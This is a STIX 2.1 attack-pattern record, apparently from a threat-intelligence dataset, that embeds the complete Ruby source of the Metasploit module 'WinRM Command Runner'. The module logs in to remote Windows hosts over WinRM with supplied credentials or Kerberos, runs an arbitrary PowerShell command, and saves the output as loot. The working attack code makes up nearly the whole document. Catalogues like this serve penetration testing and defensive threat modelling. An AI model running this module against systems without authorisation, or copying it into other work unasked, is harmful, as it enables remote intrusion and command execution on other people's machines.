{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5dee6bf1-eff8-482d-96d5-f40b2aec5c7e",
    "created": "2024-08-14T16:27:09.580741Z",
    "modified": "2024-08-14T16:27:09.580745Z",
    "name": "WinRM Command Runner",
    "description": " This module runs arbitrary Windows commands using the WinRM Service ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/winrm/winrm_cmd.rb",
            "external_id": "winrm_cmd.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/winrm/connection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::WinRM\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'WinRM Command Runner',\n      'Description' => %q{\n        This module runs arbitrary Windows commands using the WinRM Service\n        },\n      'Author' => [ 'thelightcosine' ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptString.new('CMD', [ true, 'The windows command to run', 'ipconfig /all' ]),\n        OptString.new('USERNAME', [ true, 'The username to authenticate as'])\n      ]\n    )\n  end\n\n  def run\n    check_winrm_parameters\n    super\n  end\n\n  def run_host(ip)\n    rhost = datastore['RHOST']\n    rport = datastore['RPORT']\n    uri = datastore['URI']\n    ssl = datastore['SSL']\n    schema = ssl ? 'https' : 'http'\n    endpoint = \"#{schema}://#{rhost}:#{rport}#{uri}\"\n    opts = {\n      endpoint: endpoint,\n      host: rhost,\n      port: rport,\n      proxies: datastore['Proxies'],\n      uri: uri,\n      ssl: ssl,\n      transport: :rexhttp,\n      no_ssl_peer_verification: true,\n      operation_timeout: 1,\n      timeout: 20,\n      retry_limit: 1,\n      realm: datastore['DOMAIN']\n    }\n    case datastore['Winrm::Auth']\n    when Msf::Exploit::Remote::AuthOption::KERBEROS\n      kerberos_authenticator = Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::HTTP.new(\n        host: datastore['DomainControllerRhost'],\n        hostname: datastore['Winrm::Rhostname'],\n        proxies: datastore['proxies'],\n        realm: datastore['DOMAIN'],\n        username: datastore['USERNAME'],\n        password: datastore['PASSWORD'],\n        timeout: 20, # datastore['timeout']\n        framework: framework,\n        framework_module: self,\n        cache_file: datastore['Winrm::Krb5Ccname'].blank? ? nil : datastore['Winrm::Krb5Ccname'],\n        mutual_auth: true,\n        use_gss_checksum: true,\n        ticket_storage: kerberos_ticket_storage,\n        offered_etypes: Msf::Exploit::Remote::AuthOption.as_default_offered_etypes(datastore['Winrm::KrbOfferedEncryptionTypes'])\n      )\n      opts = opts.merge({\n        user: '', # Need to provide it, otherwise the WinRM module complains\n        password: '', # Need to provide it, otherwise the WinRM module complains\n        kerberos_authenticator: kerberos_authenticator,\n        vhost: datastore['RHOSTNAME']\n      })\n    else\n      opts = opts.merge({\n        user: datastore['USERNAME'],\n        password: datastore['PASSWORD'],\n      })\n    end\n    conn = Net::MsfWinRM::RexWinRMConnection.new(opts)\n\n    begin\n      shell = conn.shell(:powershell)\n      lines = []\n      shell.run(datastore['CMD']) do |stdout, stderr|\n        stdout&.each_line do |line|\n          print_line(line.rstrip)\n          lines << line\n        end\n        print_error(stderr) if stderr\n      end\n      data = lines.join\n      path = store_loot('winrm.cmd_results', 'text/plain', ip, data, 'winrm_cmd_results.txt', 'WinRM CMD Results')\n      print_good \"Results saved to #{path}\"\n    ensure\n      shell.close if shell\n    end\n  end\nend\n"
}